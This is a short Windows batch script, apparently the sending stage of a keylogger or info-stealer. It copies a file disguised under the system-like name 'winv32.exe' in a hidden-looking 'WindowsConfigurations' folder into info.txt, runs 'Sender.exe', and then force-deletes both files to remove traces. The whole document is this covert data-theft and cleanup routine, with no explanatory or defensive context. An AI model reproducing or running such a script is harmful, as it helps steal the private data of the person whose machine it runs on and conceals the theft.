@echo off
type %homedrive%\%homepath%\WindowsConfigurations\winv32.exe>> info.txt
Sender.exe
del /f info.txt
del /f %homedrive%\%homepath%\WindowsConfigurations\winv32.exe
exit

